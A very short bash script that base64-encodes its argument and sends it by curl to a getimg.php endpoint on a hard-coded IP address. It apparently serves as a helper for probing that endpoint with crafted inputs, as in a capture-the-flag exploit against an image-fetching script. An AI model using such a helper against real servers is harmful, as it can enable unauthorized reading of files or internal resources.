#!/bin/bash

REQUEST=$(echo $1 | base64 -w 0)
curl http://3.91.17.218/getimg.php?img=$REQUEST
